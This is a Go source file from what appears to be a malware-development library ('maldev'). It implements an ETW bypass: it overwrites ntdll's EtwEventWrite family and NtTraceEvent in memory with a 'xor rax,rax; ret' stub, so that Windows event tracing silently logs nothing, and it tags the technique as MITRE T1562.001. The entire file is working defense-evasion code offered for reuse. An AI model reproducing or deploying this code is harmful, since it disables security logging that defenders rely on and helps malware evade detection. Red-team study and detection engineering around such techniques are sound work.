//go:build windows

// Package etw provides ETW (Event Tracing for Windows) bypass techniques.
//
// Technique: Runtime patching of ntdll ETW event writing functions.
// MITRE ATT&CK: T1562.001 (Impair Defenses: Disable or Modify Tools)
// Detection: Medium — patches ntdll.dll in-memory, detectable by integrity checks.
//
// The patch overwrites function entries with: xor rax, rax; ret (48 33 C0 C3)
// This makes all ETW event writes silently succeed without logging anything.
package etw

import (
	"errors"
	"fmt"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// patch is the x64 stub: XOR RAX,RAX; RET — makes function return STATUS_SUCCESS.
var patch = []byte{0x48, 0x33, 0xC0, 0xC3}

// PatchETW patches all 5 ETW event writing functions in ntdll.dll:
//   - EtwEventWrite
//   - EtwEventWriteEx
//   - EtwEventWriteFull
//   - EtwEventWriteString
//   - EtwEventWriteTransfer
//
// Each function is overwritten with XOR RAX,RAX; RET so it returns
// STATUS_SUCCESS without writing any event.
// Procs that are not present on the current OS version are silently skipped.
// If caller is non-nil, memory protection changes use the specified syscall method.
func PatchETW(caller *wsyscall.Caller) error {
	procs := []*windows.LazyProc{
		api.ProcEtwEventWrite,
		api.ProcEtwEventWriteEx,
		api.ProcEtwEventWriteFull,
		api.ProcEtwEventWriteString,
		api.ProcEtwEventWriteTransfer,
	}
	for _, proc := range procs {
		if err := api.PatchProcWithCaller(proc, patch, caller); err != nil {
			if errors.Is(err, api.ErrProcNotFound) {
				continue
			}
			return err
		}
	}
	return nil
}

// PatchNtTraceEvent patches NtTraceEvent in ntdll.dll with XOR RAX,RAX; RET
// (0x48 0x33 0xC0 0xC3) to return STATUS_SUCCESS. This is a lower-level
// function used by some ETW providers.
// If caller is non-nil, memory protection changes use the specified syscall method.
func PatchNtTraceEvent(caller *wsyscall.Caller) error {
	proc := api.Ntdll.NewProc("NtTraceEvent")
	if err := proc.Find(); err != nil {
		return nil // not present
	}
	return api.PatchMemoryWithCaller(proc.Addr(), patch, caller)
}

// PatchAll applies both PatchETW and PatchNtTraceEvent.
// Returns the first error encountered, or nil if both succeed.
func PatchAll(caller *wsyscall.Caller) error {
	if err := PatchETW(caller); err != nil {
		return fmt.Errorf("PatchETW: %w", err)
	}
	if err := PatchNtTraceEvent(caller); err != nil {
		return fmt.Errorf("PatchNtTraceEvent: %w", err)
	}
	return nil
}
